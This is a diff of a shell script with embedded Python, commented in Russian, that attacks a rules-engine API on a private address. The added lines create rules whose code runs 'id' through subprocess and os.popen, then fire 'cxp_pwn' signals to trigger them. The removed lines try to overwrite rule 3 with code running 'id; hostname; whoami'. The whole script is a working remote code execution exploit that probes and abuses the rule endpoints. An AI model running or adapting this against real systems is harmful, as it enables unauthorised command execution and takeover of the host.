@@ -1,36 +1,38 @@
-echo "=== FIRE SIGNAL (правильный формат) ==="
-python3 << 'FIRE'
+echo "=== CREATE SIGNAL RULE (правильная структура) ==="
+python3 << 'SR'
 import urllib.request,json
 B="http://192.168.3.121:8000"
-# Fire signal с правильным форматом
-for payload in [
-    {"signal_name":"manual"},
-    {"signal_name":"manual","context":{"cmd":"id"}},
-    {"signal_name":"cxp-test2"},
-    {"signal_name":"trigger","content_id":1},
+# Сначала: GET существующие rules (полный ответ)
+r=urllib.request.urlopen(B+"/api/v1/rules",timeout=8)
+data=json.loads(r.read())
+print("CURRENT RULES:",json.dumps(data,indent=1)[:800])
+# Создаём правило с signal_name триггером
+for rule in [
+    # вариант 1: signal_name в триггере
+    {"name":"cxp-signal","trigger":{"signal_name":"cxp_pwn","type":"signal"},
+     "code":"import subprocess as sp; result=sp.run(['id'],capture_output=True,text=True).stdout",
+     "codeType":"python"},
+    # вариант 2: простой signal_name
+    {"name":"cxp-sig2","signal_name":"cxp_pwn2",
+     "code":"import os; result=os.popen('id').read()",
+     "codeType":"python"},
 ]:
+    req=urllib.request.Request(B+"/api/v1/rules",data=json.dumps(rule).encode(),
+        headers={"Content-Type":"application/json"})
+    try:
+        r=urllib.request.urlopen(req,timeout=8)
+        print(f"CREATE {rule['name']}: {r.status} {r.read()[:300]}")
+    except urllib.error.HTTPError as e:
+        print(f"CREATE {rule['name']}: {e.code} {e.read()[:200]}")
+# Теперь fire с signal_name
+for sig in [{"signal_name":"cxp_pwn"},{"signal_name":"cxp_pwn2"}]:
     req=urllib.request.Request(B+"/api/v1/rules/signals/fire",
-        data=json.dumps(payload).encode(),
+        data=json.dumps(sig).encode(),
         headers={"Content-Type":"application/json"})
     try:
         r=urllib.request.urlopen(req,timeout=10)
-        print(f"FIRE {payload['signal_name']}: {r.status} {r.read()[:300]}")
+        print(f"FIRE {sig['signal_name']}: {r.status} {r.read()[:500]}")
     except urllib.error.HTTPError as e:
-        print(f"FIRE {payload['signal_name']}: {e.code} {e.read()[:200]}")
-# Также: PUT rule с Python кодом
-rule_code={"name":"cxp-exec","codeType":"python","conditionType":"expression","conditionExpr":"True","actionCode":"import os; result = os.popen('id; hostname; whoami').read()"}
-req=urllib.request.Request(B+"/api/v1/rules/3",data=json.dumps(rule_code).encode(),
-    headers={"Content-Type":"application/json"},method="PUT")
-try:
-    r=urllib.request.urlopen(req,timeout=8)
-    print(f"RULE-UPDATE: {r.status} {r.read()[:200]}")
-except urllib.error.HTTPError as e:
-    print(f"RULE-UPDATE: {e.code} {e.read()[:200]}")
-# GET rule 3 (что внутри)
-req=urllib.request.Request(B+"/api/v1/rules/3")
-try:
-    r=urllib.request.urlopen(req,timeout=8)
-    print(f"RULE-GET: {r.read()[:300]}")
-except Exception as e: print(f"RULE-GET: {e}")
-FIRE
-echo FIRE-SIGNAL
+        print(f"FIRE {sig['signal_name']}: {e.code} {e.read()[:300]}")
+SR
+echo SIGNAL-RULE
